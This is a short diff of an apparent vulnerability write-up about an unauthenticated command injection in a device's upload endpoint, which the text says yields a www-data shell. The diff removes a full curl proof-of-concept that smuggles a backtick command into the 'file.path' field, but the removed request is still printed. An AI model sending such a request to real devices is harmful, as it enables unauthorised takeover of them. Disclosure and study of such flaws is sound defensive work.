@@ -80,8 +80,5 @@ Step into sub_11500:
 ...
 ```
 It's easy to inject a system command.    
-To trigger it:
-```
-curl -i -k https://192.168.1.1/upload -X POST -F 'filename=config.xml' -F 'input="<input><fileType>configuration</fileType><source><location-url>FILE://Configuration/config.xml</location-url></source><destination><config-type>config-running</config-type></destination></input>"' -F "file=@/tmp/1" -F "file.path=/tmp/input\`cmd to execute\`" -H "Accept: application/vnd.yang.data+xml" >/dev/null 2>&1
-```
+
 It doesn't requrie authentication and you can get a shell with www-data privilege.
